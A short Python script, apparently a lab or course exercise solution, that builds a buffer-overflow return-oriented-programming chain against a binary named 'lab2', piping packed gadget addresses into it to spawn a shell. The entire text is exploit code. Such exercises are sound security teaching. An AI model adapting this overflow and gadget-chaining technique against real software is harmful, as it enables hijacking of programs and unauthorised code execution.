import os
import struct

#Find gadgets
pop_ret = 0x004005e3
pop_pop_ret = 0x004005e2
exec_string = 0x0040056d
add_bin = 0x00400598
add_bash = 0x004005e5

#Buffer Overflow
payload = "A"*112

#add_bin(0xdeadbeef) gadget
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

#add_bash(0xcafebabe, 0x0badf00d) gadget
payload += struct.pack("I", add_bash)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0x0badf00d)

#exec_string
payload += struct.pack("I", exec_string)

#write the shellcode to a file
f = open("shellcode", "wr+")
f.write(payload)
f.close()

#launch ROP attack
os.system("cat shellcode -| ./lab2")
